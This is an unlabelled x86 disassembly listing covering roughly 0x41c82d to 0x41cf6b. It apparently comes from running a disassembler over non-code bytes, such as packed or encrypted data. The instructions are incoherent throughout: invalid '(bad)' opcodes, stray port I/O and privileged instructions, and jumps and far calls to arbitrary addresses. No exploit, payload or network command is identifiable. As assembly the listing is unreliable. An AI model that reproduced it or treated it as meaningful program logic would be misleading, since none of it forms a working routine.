  41c82d:	nop
  41c82e:	outs   dx,BYTE PTR ds:[esi]
  41c82f:	adc    esi,DWORD PTR [ebx+0x451ce563]
  41c835:	mov    ds:0x6b400bb5,al
  41c83a:	ds mov edx,0xc220f8ca
  41c840:	xchg   ebx,eax
  41c841:	and    dh,BYTE PTR [ebx-0xa]
  41c844:	mov    esp,0x7e3fffc6
  41c849:	xchg   BYTE PTR [ebx+0x762a9302],bh
  41c84f:	inc    edi
  41c850:	outs   dx,BYTE PTR ds:[esi]
  41c851:	push   edx
  41c852:	into   
  41c853:	retf   0x95fd
  41c856:	cmp    DWORD PTR [ecx+esi*1-0x5b],0xc4ea67a5
  41c85e:	add    ebp,DWORD PTR [esi]
  41c860:	add    esp,ebp
  41c862:	repnz pop es
  41c864:	das    
  41c865:	sar    edi,cl
  41c867:	neg    BYTE PTR ds:0xc4ee19c
  41c86d:	in     eax,dx
  41c86e:	(bad)  
  41c86f:	stc    
  41c870:	xchg   ebx,eax
  41c871:	sbb    edx,eax
  41c873:	test   esp,esp
  41c875:	out    dx,eax
  41c876:	iret   
  41c877:	cdq    
  41c878:	sub    eax,0x995c96b6
  41c87d:	cmp    eax,0xef9d7728
  41c882:	lea    ebp,[edx-0x4add84f4]
  41c888:	jecxz  0x41c8e6
  41c88a:	imul   esi,DWORD PTR [esi],0x113b2524
  41c890:	or     al,0xce
  41c892:	cmp    BYTE PTR [edx],ch
  41c894:	sti    
  41c895:	scas   al,BYTE PTR es:[edi]
  41c896:	repz cmp al,0x29
  41c899:	xor    dl,BYTE PTR [eax+ebx*1-0x56]
  41c89d:	jne    0x41c87e
  41c89f:	outs   dx,DWORD PTR ds:[esi]
  41c8a0:	hlt    
  41c8a1:	imul   ebx,DWORD PTR [eax],0x10
  41c8a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8a5:	push   0x9
  41c8a7:	ror    eax,cl
  41c8a9:	adc    ah,BYTE PTR [ebx-0x8]
  41c8ac:	fmul   st(7),st
  41c8ae:	inc    eax
  41c8af:	or     DWORD PTR [ebx+0x69],0x9f10d93d
  41c8b6:	sub    al,0x12
  41c8b8:	test   DWORD PTR [ecx+0x3cd9ffd0],edx
  41c8be:	stc    
  41c8bf:	sub    DWORD PTR [ecx+esi*1+0x4472a7d1],edi
  41c8c6:	scas   al,BYTE PTR es:[edi]
  41c8c7:	stos   BYTE PTR es:[edi],al
  41c8c8:	(bad)  
  41c8c9:	(bad)  
  41c8cb:	sub    DWORD PTR [esi],edi
  41c8cd:	pushf  
  41c8ce:	aam    0x58
  41c8d0:	cmp    BYTE PTR [esi-0x289f7091],bh
  41c8d6:	xor    eax,0x87583f48
  41c8db:	mov    esp,0xca52e14
  41c8e0:	in     al,dx
  41c8e1:	out    dx,al
  41c8e2:	(bad)  
  41c8e3:	mov    ds:0x2941f729,al
  41c8e8:	dec    edi
  41c8e9:	lock dec ecx
  41c8eb:	add    eax,0xb163bb1c
  41c8f0:	stos   BYTE PTR es:[edi],al
  41c8f1:	push   ebp
  41c8f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8f3:	inc    ebx
  41c8f4:	and    BYTE PTR [esi],dl
  41c8f6:	adc    eax,0xa503a9e8
  41c8fb:	jbe    0x41c91c
  41c8fd:	sub    al,0x2c
  41c8ff:	popf   
  41c900:	push   0x25
  41c902:	rol    DWORD PTR [edx+0x783f6a77],1
  41c908:	jge    0x41c8ee
  41c90a:	or     eax,0xe61cc58c
  41c90f:	pop    ecx
  41c910:	ins    DWORD PTR es:[edi],dx
  41c911:	je     0x41c95c
  41c913:	icebp  
  41c914:	or     al,0xa0
  41c916:	cs ja  0x41c938
  41c919:	xchg   esi,eax
  41c91a:	test   al,0x91
  41c91c:	add    BYTE PTR ds:0x23e8031c,dl
  41c922:	and    ah,cl
  41c924:	sti    
  41c925:	pop    esi
  41c926:	add    edx,DWORD PTR [edx+ebx*1-0x2c]
  41c92a:	int3   
  41c92b:	jmp    0xfb0d2aea
  41c930:	pop    ecx
  41c931:	icebp  
  41c932:	push   esp
  41c933:	in     al,dx
  41c934:	(bad)  
  41c935:	jmp    0x282f7908
  41c93a:	or     dl,dh
  41c93c:	sbb    al,0xc1
  41c93e:	or     esp,ebp
  41c940:	shl    DWORD PTR [ecx],cl
  41c942:	dec    edi
  41c943:	mov    ds:0x1a78a3cc,al
  41c948:	adc    DWORD PTR [edx+0x1bbf8e1],edi
  41c94e:	ret    
  41c94f:	cmp    al,0xe7
  41c951:	retf   0x27e8
  41c954:	push   cs
  41c955:	xchg   al,bl
  41c957:	xchg   esi,esp
  41c959:	sbb    BYTE PTR [edx+edi*2-0x4f6c86b3],0xe3
  41c961:	mov    DWORD PTR [eax+0x63ef0ab6],ebx
  41c967:	jp     0x41c918
  41c969:	sub    dh,BYTE PTR [esi+0x13]
  41c96c:	push   es
  41c96d:	jno    0x41c95e
  41c96f:	xchg   ecx,eax
  41c970:	sub    BYTE PTR [ecx+0x2d91cdab],ch
  41c976:	push   esi
  41c977:	sti    
  41c978:	mov    esp,0x43653b68
  41c97d:	push   0xc0e4696b
  41c982:	jl     0x41ca02
  41c984:	xor    DWORD PTR [ecx-0x23af9c0f],ebp
  41c98a:	add    ch,dh
  41c98c:	jne    0x41c95b
  41c98e:	and    eax,0x781e34
  41c993:	fs pop edi
  41c995:	cdq    
  41c996:	jg     0x41c98e
  41c998:	imul   edx,ecx,0xd366d78a
  41c99e:	sti    
  41c99f:	shl    ch,0xe
  41c9a2:	pusha  
  41c9a3:	xchg   ebp,eax
  41c9a4:	sub    ah,bh
  41c9a6:	cmp    eax,0x5e7d3e52
  41c9ab:	outs   dx,DWORD PTR ds:[esi]
  41c9ac:	mov    WORD PTR [edx-0x804cca2],ss
  41c9b2:	dec    ebp
  41c9b3:	sub    al,0xf4
  41c9b5:	jno    0x41ca16
  41c9b7:	test   cl,dl
  41c9b9:	ins    BYTE PTR es:[edi],dx
  41c9ba:	xor    al,0x5f
  41c9bc:	leave  
  41c9bd:	ins    BYTE PTR es:[edi],dx
  41c9be:	push   0xfc8a1bb4
  41c9c3:	pop    ds
  41c9c4:	nop
  41c9c5:	test   eax,0x7385a156
  41c9ca:	mov    ch,0xf1
  41c9cc:	push   0x3199ee18
  41c9d1:	hlt    
  41c9d2:	add    eax,0xade7f92c
  41c9d7:	icebp  
  41c9d8:	fisubr DWORD PTR [edx+0x6bb6d841]
  41c9de:	xor    esp,esi
  41c9e0:	mov    BYTE PTR [edi],0x66
  41c9e3:	xor    ah,cl
  41c9e5:	push   cs
  41c9e6:	pop    ss
  41c9e7:	fistp  WORD PTR [edi+ecx*1-0x6a]
  41c9eb:	xor    DWORD PTR [edx-0x5115575e],edx
  41c9f1:	xor    esp,ecx
  41c9f3:	inc    edi
  41c9f4:	cs test dh,cl
  41c9f7:	repnz xor eax,ebp
  41c9fa:	mov    cs,WORD PTR [ebp+0x7b5ab662]
  41ca00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca01:	lea    esp,[eax]
  41ca03:	dec    ecx
  41ca04:	out    dx,eax
  41ca05:	jno    0x41c99b
  41ca07:	pusha  
  41ca08:	mov    ah,0xfb
  41ca0a:	repz dec eax
  41ca0c:	cdq    
  41ca0d:	call   0x7eff0c47
  41ca12:	pop    ebx
  41ca13:	test   DWORD PTR [edx-0x48],edi
  41ca16:	mov    al,ds:0x8cc763b7
  41ca1b:	push   eax
  41ca1c:	(bad)  
  41ca1d:	in     al,0x59
  41ca1f:	fst    st(6)
  41ca21:	ja     0x41c9f6
  41ca23:	aas    
  41ca24:	xor    eax,0xe541e992
  41ca29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca2a:	fild   WORD PTR [edx+0x77469739]
  41ca30:	ret    
  41ca31:	jg     0x41ca03
  41ca33:	sub    BYTE PTR [edx+0x28],al
  41ca36:	mov    esi,0x7be637d8
  41ca3b:	popf   
  41ca3c:	(bad)  
  41ca3d:	gs in  eax,0xb8
  41ca40:	push   ss
  41ca41:	lea    edx,[esi+0x2e]
  41ca44:	push   edx
  41ca45:	or     eax,esp
  41ca47:	(bad)  
  41ca48:	xchg   edx,eax
  41ca49:	mov    bl,0x19
  41ca4b:	call   0x77f2fcec
  41ca50:	pop    ebx
  41ca51:	retf   0xc96b
  41ca54:	dec    esp
  41ca55:	popf   
  41ca56:	mov    bl,0x15
  41ca58:	push   0x192e63f6
  41ca5d:	cld    
  41ca5e:	jae    0x41ca21
  41ca60:	nop
  41ca61:	inc    edi
  41ca63:	mov    esi,0xd1a55347
  41ca68:	in     eax,dx
  41ca69:	cs push ds
  41ca6b:	or     eax,0x1cf7c6fb
  41ca70:	imul   ecx,DWORD PTR [ebx],0x347c1d91
  41ca76:	jle    0x41ca0a
  41ca78:	mov    ebp,0x575a0a87
  41ca7d:	xor    BYTE PTR [ebp-0x40],bl
  41ca80:	xchg   ecx,eax
  41ca81:	cmp    ebp,DWORD PTR [edi+edx*2+0x4438a28b]
  41ca88:	sub    DWORD PTR [esi+ebp*2],ecx
  41ca8b:	das    
  41ca8c:	xor    al,0x10
  41ca8e:	mov    ebx,ebp
  41ca90:	int    0x7
  41ca92:	iret   
  41ca93:	cmp    eax,0x6724a1e7
  41ca98:	mov    eax,DWORD PTR [ecx+ebx*2+0x11]
  41ca9c:	shl    DWORD PTR [edx],cl
  41ca9e:	mov    WORD PTR [ebp+0x6e15026a],ds
  41caa4:	jecxz  0x41ca95
  41caa6:	fadd   QWORD PTR [esi+0x3d5578e]
  41caac:	sar    DWORD PTR [esi-0x98a03de],cl
  41cab2:	jb     0x41caef
  41cab4:	xchg   esp,eax
  41cab5:	inc    ebx
  41cab6:	clc    
  41cab7:	sub    al,0x7d
  41cab9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caba:	sub    BYTE PTR [ebx+0x638830b7],ah
  41cac0:	stos   DWORD PTR es:[edi],eax
  41cac1:	(bad)  
  41cac2:	mov    ebp,0x8cc7ce
  41cac7:	jmp    0x9b3ac14c
  41cacc:	pop    ds
  41cacd:	cli    
  41cace:	cld    
  41cacf:	cwde   
  41cad0:	push   0xcd01c537
  41cad5:	aad    0xd1
  41cad7:	cli    
  41cad8:	jle    0x41cb49
  41cada:	adc    eax,0xed925965
  41cadf:	xchg   ecx,eax
  41cae0:	scas   eax,DWORD PTR es:[edi]
  41cae1:	daa    
  41cae2:	cwde   
  41cae3:	hlt    
  41cae4:	dec    ecx
  41cae5:	outs   dx,DWORD PTR ds:[esi]
  41cae6:	adc    cl,0x49
  41cae9:	xor    BYTE PTR [esi-0x32],0x27
  41caed:	in     eax,dx
  41caee:	fsub   QWORD PTR [ebp-0x12]
  41caf1:	adc    dl,0x1a
  41caf4:	xchg   esi,eax
  41caf5:	and    BYTE PTR [edx],ch
  41caf7:	jp     0x41caa4
  41caf9:	bound  ecx,QWORD PTR [ebx+0x3e]
  41cafc:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cafe:	mov    dh,0xdf
  41cb00:	retf   0x7416
  41cb03:	push   esp
  41cb04:	aaa    
  41cb05:	clc    
  41cb06:	xor    BYTE PTR [esi],cl
  41cb08:	mov    eax,ds:0x4cb3792f
  41cb0d:	jne    0x41cb4d
  41cb0f:	popa   
  41cb10:	ins    BYTE PTR es:[edi],dx
  41cb11:	je     0x41cb29
  41cb13:	cmc    
  41cb14:	imul   esp,DWORD PTR [eax+0x46],0x19
  41cb18:	push   ss
  41cb19:	outs   dx,BYTE PTR ds:[esi]
  41cb1a:	adc    edx,DWORD PTR ds:0x4b33ec2b
  41cb20:	cli    
  41cb21:	scas   eax,DWORD PTR es:[edi]
  41cb22:	gs jnp 0x41cb6b
  41cb25:	stos   BYTE PTR es:[edi],al
  41cb26:	jg     0x41cacd
  41cb28:	shr    DWORD PTR [edx-0x72],cl
  41cb2b:	sbb    ecx,DWORD PTR [ebx]
  41cb2d:	es rol ebp,1
  41cb30:	push   ss
  41cb31:	ins    DWORD PTR es:[edi],dx
  41cb32:	xor    al,0x44
  41cb34:	lea    edi,ds:0x502fe571
  41cb3a:	cld    
  41cb3b:	inc    ecx
  41cb3c:	stos   DWORD PTR es:[edi],eax
  41cb3d:	jo     0x41cb94
  41cb3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb40:	pushf  
  41cb41:	push   ebp
  41cb42:	pushf  
  41cb43:	or     al,0xf3
  41cb45:	enter  0x6b58,0x6e
  41cb49:	jbe    0x41cae1
  41cb4b:	add    edi,ebp
  41cb4d:	jno    0x41cb19
  41cb4f:	jnp    0x41caec
  41cb51:	loop   0x41cba3
  41cb53:	cmp    al,0xa9
  41cb55:	inc    DWORD PTR [eax+0x53532ad1]
  41cb5b:	cmp    ecx,ebp
  41cb5d:	jmp    0x9d1e4195
  41cb62:	cwde   
  41cb63:	daa    
  41cb64:	jbe    0x41cb87
  41cb66:	loop   0x41cb80
  41cb68:	pop    esi
  41cb69:	cmp    eax,eax
  41cb6b:	pop    ds
  41cb6c:	stc    
  41cb6d:	add    dl,BYTE PTR ds:0x24804f27
  41cb73:	or     BYTE PTR [esi-0x78bad2cc],dl
  41cb79:	cmp    eax,0x665b04ef
  41cb7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb7f:	inc    edx
  41cb80:	xor    DWORD PTR [ebx+0x9],ebp
  41cb83:	pop    ebp
  41cb84:	fadd   QWORD PTR [edx+0x629af12f]
  41cb8a:	sub    dl,ch
  41cb8c:	jnp    0x41cb97
  41cb8e:	(bad)  
  41cb90:	rcl    DWORD PTR [eax-0x56],cl
  41cb93:	out    0x4c,al
  41cb95:	xchg   esp,eax
  41cb96:	loopne 0x41cc02
  41cb98:	stos   BYTE PTR es:[edi],al
  41cb99:	sub    BYTE PTR [ecx+0x3aa7133f],al
  41cb9f:	test   al,0x80
  41cba1:	iret   
  41cba2:	inc    ecx
  41cba3:	sbb    DWORD PTR [eax],edx
  41cba5:	push   es
  41cba6:	stos   BYTE PTR es:[edi],al
  41cba7:	int3   
  41cba8:	sbb    edi,DWORD PTR [eax-0x15]
  41cbab:	pop    edi
  41cbac:	sbb    ecx,ebp
  41cbae:	fisubr WORD PTR [ecx+eax*2]
  41cbb1:	push   ecx
  41cbb2:	push   0xffffffd9
  41cbb4:	xchg   ecx,eax
  41cbb5:	dec    esp
  41cbb6:	push   eax
  41cbb7:	outs   dx,BYTE PTR ds:[esi]
  41cbb8:	mov    al,ds:0x58293e71
  41cbbd:	xlat   BYTE PTR ds:[ebx]
  41cbbe:	test   al,0xcb
  41cbc0:	fsubr  DWORD PTR [edi-0x44]
  41cbc3:	dec    ebx
  41cbc4:	pop    edx
  41cbc5:	cmp    al,0x53
  41cbc7:	stc    
  41cbc8:	xlat   BYTE PTR ds:[ebx]
  41cbc9:	pop    edx
  41cbca:	push   0x474fd9b
  41cbcf:	xchg   ebx,eax
  41cbd0:	push   0xffffff9d
  41cbd2:	call   0x1fa8:0xf50ec9f7
  41cbd9:	adc    al,0x82
  41cbdb:	(bad)  
  41cbdc:	rsqrtps xmm2,XMMWORD PTR [edx+0x3b]
  41cbe0:	cmp    DWORD PTR [esi],edx
  41cbe2:	out    0xdb,al
  41cbe4:	das    
  41cbe5:	pop    edx
  41cbe6:	ds (bad) 
  41cbe8:	(bad)  
  41cbea:	cmp    al,0x95
  41cbec:	adc    DWORD PTR [eax-0x55f85c89],0xffffffc5
  41cbf3:	inc    edi
  41cbf4:	jne    0x41cc3a
  41cbf6:	aam    0x9e
  41cbf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbf9:	call   0xd46d6b1d
  41cbfe:	mov    ds:0x5bba8357,eax
  41cc03:	or     edx,DWORD PTR [esi+0x68]
  41cc06:	sahf   
  41cc07:	and    al,0xcd
  41cc09:	imul   esp,edi,0xfde0f47e
  41cc0f:	or     DWORD PTR [ecx+0x12],ebp
  41cc12:	xor    al,0xc6
  41cc14:	jbe    0x41cc80
  41cc16:	push   edi
  41cc17:	cmp    cl,0xa8
  41cc1a:	sub    ch,BYTE PTR [esi+ecx*2-0x3e]
  41cc1e:	mov    ds:0x9f66459,eax
  41cc23:	(bad)  
  41cc24:	sbb    ecx,DWORD PTR [edi-0x54]
  41cc27:	test   ebp,ebx
  41cc29:	xor    ebx,ebp
  41cc2b:	and    al,0x2d
  41cc2d:	(bad)  
  41cc2e:	or     eax,0x5098bf14
  41cc33:	or     dh,BYTE PTR [esi]
  41cc35:	gs cdq 
  41cc37:	(bad)  [eax]
  41cc39:	inc    esp
  41cc3a:	jle    0x41cc2f
  41cc3c:	push   esi
  41cc3d:	ins    DWORD PTR es:[edi],dx
  41cc3e:	ja     0x41cc74
  41cc40:	shl    dh,1
  41cc42:	xor    ebp,0x5b
  41cc45:	add    ebp,DWORD PTR [ebx+0x2471f65c]
  41cc4b:	adc    ecx,DWORD PTR [edx+0xc890fd9]
  41cc51:	mov    dh,0xe9
  41cc53:	xor    DWORD PTR [ebx+0x4a],0x9b973fff
  41cc5a:	fldenv [esi]
  41cc5c:	sub    DWORD PTR [ecx+0x47],edx
  41cc5f:	sub    al,0x6c
  41cc61:	sub    bh,BYTE PTR [ecx-0xd]
  41cc64:	cli    
  41cc65:	pop    edi
  41cc66:	mov    al,0xc9
  41cc68:	dec    ebx
  41cc69:	or     al,0xa7
  41cc6b:	sbb    ch,BYTE PTR [edi-0x13]
  41cc6e:	pop    edi
  41cc6f:	or     DWORD PTR [eax+0x11f29807],0xe9159e06
  41cc79:	push   cs
  41cc7a:	xchg   ecx,eax
  41cc7b:	pop    edi
  41cc7c:	pop    esi
  41cc7d:	test   al,0xc4
  41cc7f:	sbb    al,0x92
  41cc81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc82:	(bad)  
  41cc83:	out    dx,eax
  41cc84:	jo     0x41cc06
  41cc86:	call   0x801090e9
  41cc8b:	addr16 cwde 
  41cc8d:	push   cs
  41cc8e:	push   0x13
  41cc90:	mov    ?,WORD PTR [esi-0x3dc3b2b1]
  41cc96:	cmc    
  41cc97:	pop    es
  41cc98:	jno    0x41cd13
  41cc9a:	pushf  
  41cc9b:	xchg   ebp,eax
  41cc9c:	icebp  
  41cc9d:	cmp    DWORD PTR [ecx+0x22e7be61],esp
  41cca3:	pop    esp
  41cca4:	test   al,0xf1
  41cca6:	cmp    dh,al
  41cca8:	or     BYTE PTR [ecx+0x25],0x85
  41ccac:	and    BYTE PTR [edi-0x73578c98],ah
  41ccb2:	pop    edx
  41ccb3:	mov    eax,0x5a84a427
  41ccb8:	xchg   edx,eax
  41ccb9:	dec    edi
  41ccba:	in     al,dx
  41ccbb:	sar    dl,1
  41ccbd:	jle    0x41ccf6
  41ccbf:	inc    eax
  41ccc0:	aaa    
  41ccc1:	out    dx,al
  41ccc2:	and    DWORD PTR [esp+ecx*2],edi
  41ccc5:	jbe    0x41cc77
  41ccc7:	xchg   ebx,eax
  41ccc8:	xor    eax,0x2be8785d
  41cccd:	shr    cl,cl
  41cccf:	inc    edi
  41ccd0:	sbb    al,0xae
  41ccd2:	jge    0x41cc92
  41ccd4:	addr16 xchg esp,eax
  41ccd6:	pop    ecx
  41ccd7:	fisubr DWORD PTR [eax+0x45189ca6]
  41ccdd:	cmc    
  41ccde:	or     BYTE PTR [ebx+ebp*8+0x21ee062b],ch
  41cce5:	bnd ja 0x41ccd7
  41cce8:	and    eax,0x1f295816
  41cced:	cmp    DWORD PTR [edx],0x840a6fc9
  41ccf3:	dec    ecx
  41ccf4:	aaa    
  41ccf5:	test   DWORD PTR [edx+0x2010492d],0x3e86552d
  41ccff:	test   eax,0xc717a9ea
  41cd04:	aad    0xda
  41cd06:	out    dx,eax
  41cd07:	mov    ?,WORD PTR [eax-0x3d]
  41cd0a:	mov    bh,0xef
  41cd0c:	lods   eax,DWORD PTR ds:[esi]
  41cd0d:	mov    ebx,0xe5a54cc8
  41cd12:	mov    BYTE PTR [edi-0x5031c37a],cl
  41cd18:	mov    esp,0x5f90b8ec
  41cd1d:	fisttp QWORD PTR [ebp-0x12]
  41cd20:	out    dx,eax
  41cd21:	lds    eax,FWORD PTR [edi-0x52]
  41cd24:	iret   
  41cd25:	aaa    
  41cd26:	gs xchg esp,eax
  41cd28:	mov    DWORD PTR [ebx],esp
  41cd2a:	and    bh,BYTE PTR [ebp-0x79]
  41cd2d:	ret    0xd299
  41cd30:	xor    al,0x31
  41cd32:	mov    bl,0x3a
  41cd34:	loopne 0x41cd5a
  41cd36:	and    bh,dh
  41cd38:	hlt    
  41cd39:	sub    al,0xcb
  41cd3b:	stos   DWORD PTR es:[edi],eax
  41cd3c:	cmp    BYTE PTR [ebp-0x36859d19],dh
  41cd42:	and    DWORD PTR [ebp+0x4e4b2e58],ecx
  41cd48:	cmp    ch,BYTE PTR [ebx+0x4d]
  41cd4b:	sbb    eax,0x799687d6
  41cd50:	rol    BYTE PTR [ebx],0xe4
  41cd53:	ins    BYTE PTR es:[edi],dx
  41cd54:	cmp    al,bh
  41cd56:	aam    0xb4
  41cd58:	push   ds
  41cd59:	mov    ecx,0x58658029
  41cd5e:	xchg   edi,eax
  41cd5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd60:	nop
  41cd61:	(bad)  
  41cd62:	leavew 
  41cd64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd65:	fisubr WORD PTR [edi-0x26]
  41cd68:	aam    0x5c
  41cd6a:	jecxz  0x41cd84
  41cd6c:	push   esi
  41cd6d:	cli    
  41cd6e:	and    dh,BYTE PTR [ebx-0x8919f72]
  41cd74:	test   BYTE PTR [esi-0x1e560420],dh
  41cd7a:	mov    ecx,0x6643aa1
  41cd7f:	adc    DWORD PTR [edi+0x23ec690b],esi
  41cd85:	rcl    DWORD PTR [ecx-0x28],1
  41cd88:	jns    0x41cd55
  41cd8a:	inc    ebp
  41cd8b:	(bad)  
  41cd8c:	pop    ds
  41cd8d:	pop    ds
  41cd8e:	pop    edx
  41cd8f:	jo     0x41cda4
  41cd91:	push   0xebaff13
  41cd96:	mov    eax,0x2012b12e
  41cd9b:	ret    0xf18f
  41cd9e:	jge    0x41cdea
  41cda0:	mov    edi,DWORD PTR [ebp+0x41]
  41cda3:	jg     0x41cd2b
  41cda5:	add    DWORD PTR [edx+0x705032e0],esp
  41cdab:	add    BYTE PTR [ebp+ebx*2-0x2477e5ad],bl
  41cdb2:	mov    al,ds:0xad675bbd
  41cdb7:	xchg   DWORD PTR [esi-0x1c],esp
  41cdba:	inc    eax
  41cdbb:	dec    ebx
  41cdbc:	cmp    dh,BYTE PTR [esi+ebx*1+0x7e]
  41cdc0:	mov    BYTE PTR [edi+0x2915e73],ah
  41cdc6:	loope  0x41ce3b
  41cdc8:	int    0xe0
  41cdca:	pop    eax
  41cdcb:	xor    eax,0xdd5e5468
  41cdd0:	xchg   esi,eax
  41cdd1:	repz mov al,0x81
  41cdd4:	ret    
  41cdd5:	inc    edx
  41cdd6:	mov    ch,0xb0
  41cdd8:	retf   0x28bc
  41cddb:	push   edi
  41cddc:	xchg   esp,eax
  41cddd:	sbb    eax,DWORD PTR [ebp-0x5c]
  41cde0:	mov    ecx,0x833f70c9
  41cde5:	xlat   BYTE PTR ds:[ebx]
  41cde6:	bound  edx,QWORD PTR [edi+0x64cc84d4]
  41cdec:	and    eax,DWORD PTR [ebx]
  41cdee:	fs gs dec edx
  41cdf1:	xchg   DWORD PTR [ecx],edi
  41cdf3:	or     cl,BYTE PTR [ecx-0x3d]
  41cdf6:	inc    esp
  41cdf7:	aam    0x1a
  41cdf9:	jmp    0x6170:0xe0dd108b
  41ce00:	jl     0x41cd98
  41ce02:	push   ecx
  41ce03:	mov    ebx,0xb4351729
  41ce08:	mov    ecx,0xd36475c3
  41ce0d:	in     al,0x2b
  41ce0f:	or     BYTE PTR [ebp+ebx*2+0xf254a5d],dl
  41ce16:	pop    esp
  41ce17:	cdq    
  41ce18:	sub    DWORD PTR [esi*1-0x21b8453a],ebp
  41ce1f:	hlt    
  41ce20:	add    al,0x7e
  41ce22:	inc    ebp
  41ce23:	das    
  41ce24:	dec    edi
  41ce25:	arpl   WORD PTR [eax-0x22710919],sp
  41ce2b:	inc    esp
  41ce2c:	outs   dx,BYTE PTR ds:[esi]
  41ce2d:	fst    QWORD PTR [edi-0x32dd2836]
  41ce33:	adc    esi,DWORD PTR [esp+esi*2]
  41ce36:	dec    edx
  41ce37:	pop    ebp
  41ce38:	cmp    al,0x59
  41ce3a:	mov    esp,0x558c8d1d
  41ce3f:	jbe    0x41ce51
  41ce41:	cmp    eax,0x2b61ee1a
  41ce46:	sub    BYTE PTR [ecx],dh
  41ce48:	sbb    eax,0xc809eacf
  41ce4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce4e:	adc    bl,BYTE PTR [edi+0x41]
  41ce51:	(bad)  
  41ce52:	neg    DWORD PTR [edi]
  41ce54:	(bad)  
  41ce55:	dec    ebx
  41ce56:	rcr    BYTE PTR [eax],0x9d
  41ce59:	leave  
  41ce5a:	and    eax,0x7abcff3f
  41ce5f:	ins    BYTE PTR es:[edi],dx
  41ce60:	std    
  41ce61:	addr16 jle 0x41ce76
  41ce64:	cmp    al,0x39
  41ce66:	jbe    0x41ce30
  41ce68:	pushf  
  41ce69:	jecxz  0x41cdf3
  41ce6b:	imul   ebp,DWORD PTR [esi+esi*4-0x39],0xffffffcb
  41ce70:	mov    cl,0xdc
  41ce72:	rcl    DWORD PTR [edi+0x73d534b5],1
  41ce78:	outs   dx,DWORD PTR ds:[esi]
  41ce79:	add    DWORD PTR [ebx-0x70],esp
  41ce7c:	lods   al,BYTE PTR ds:[esi]
  41ce7d:	push   0xffffffdb
  41ce7f:	jle    0x41ceae
  41ce81:	sahf   
  41ce82:	pop    eax
  41ce83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce84:	icebp  
  41ce85:	xor    ebp,DWORD PTR [ebp+0x62f948d8]
  41ce8b:	dec    esp
  41ce8c:	iret   
  41ce8d:	mov    dl,0xe3
  41ce8f:	inc    esi
  41ce90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce91:	and    edi,esi
  41ce93:	dec    ebx
  41ce94:	paddq  mm0,QWORD PTR [esi+0xf66508a]
  41ce9b:	aam    0x1d
  41ce9d:	lods   eax,DWORD PTR ds:[esi]
  41ce9e:	push   0x5e
  41cea0:	out    0x23,eax
  41cea2:	cmp    ch,bl
  41cea4:	pop    ebp
  41cea5:	adc    ah,BYTE PTR [ebx-0x2f0ffe52]
  41ceab:	inc    esi
  41ceac:	rcl    DWORD PTR [ebx+0x171a48cf],1
  41ceb2:	push   ss
  41ceb3:	xor    esi,DWORD PTR [edi]
  41ceb5:	mov    BYTE PTR [edx],dh
  41ceb7:	xchg   BYTE PTR [eax+0x2934bee5],ah
  41cebd:	xchg   esp,eax
  41cebe:	icebp  
  41cebf:	fdivr  st(1),st
  41cec1:	das    
  41cec2:	lods   eax,DWORD PTR ds:[esi]
  41cec3:	pushf  
  41cec4:	mov    ebp,0x87738392
  41cec9:	adc    eax,0xcbdbe97e
  41cece:	sub    al,0x30
  41ced0:	sar    BYTE PTR [edx-0x2ccf545d],0x8a
  41ced7:	adc    ecx,eax
  41ced9:	fild   WORD PTR [eax+ecx*4+0x4e]
  41cedd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cede:	jbe    0x41cf43
  41cee0:	jg     0x41cf09
  41cee2:	mov    esi,0x17b975b1
  41cee7:	and    DWORD PTR [ebx+0xf],ecx
  41ceea:	jle    0x41ce87
  41ceec:	and    DWORD PTR [ecx],ebx
  41ceee:	retf   0x4482
  41cef1:	hlt    
  41cef2:	or     esp,DWORD PTR [edx]
  41cef4:	shl    DWORD PTR [edi+0x236b54f9],cl
  41cefa:	rcr    DWORD PTR [esi],cl
  41cefc:	daa    
  41cefd:	fnstenv [edi+0x24]
  41cf00:	retf   0xba50
  41cf03:	gs pop esp
  41cf05:	jbe    0x41cef9
  41cf07:	pop    gs
  41cf09:	in     eax,0x2c
  41cf0b:	loop   0x41cf71
  41cf0d:	popa   
  41cf0e:	ins    BYTE PTR es:[edi],dx
  41cf0f:	push   es
  41cf10:	out    0xf5,al
  41cf12:	inc    esp
  41cf13:	add    edx,DWORD PTR ds:0xbb6a6630
  41cf19:	or     BYTE PTR [edx],cl
  41cf1b:	sbb    DWORD PTR [eax],ebx
  41cf1d:	xor    ecx,edi
  41cf1f:	pop    eax
  41cf20:	leave  
  41cf21:	bound  eax,QWORD PTR [esi-0xfe0b020]
  41cf27:	icebp  
  41cf28:	int    0x3d
  41cf2a:	xor    dh,cl
  41cf2c:	mov    ebx,0x44b9676b
  41cf31:	stos   BYTE PTR es:[edi],al
  41cf32:	out    0xe3,al
  41cf34:	or     edi,ebx
  41cf36:	mov    BYTE PTR [eax-0x3],ch
  41cf39:	gs mov eax,0x8f39a86c
  41cf3f:	stc    
  41cf40:	xchg   ebp,eax
  41cf41:	mov    dl,bl
  41cf43:	sbb    al,cl
  41cf45:	cmc    
  41cf46:	mov    es,WORD PTR ds:0x9c433463
  41cf4c:	imul   ecx,DWORD PTR [edi],0xffffffbe
  41cf4f:	push   esi
  41cf50:	cdq    
  41cf51:	sbb    eax,0xe0bef756
  41cf56:	sbb    WORD PTR [eax-0x3c],si
  41cf5a:	or     esi,edx
  41cf5c:	add    DWORD PTR [edi-0x1f],ebp
  41cf5f:	icebp  
  41cf60:	fst    QWORD PTR [ebx]
  41cf62:	hlt    
  41cf63:	push   ds
  41cf64:	mov    dl,0xfd
  41cf66:	jmp    0x634c9cdd
  41cf6b:	push   edx
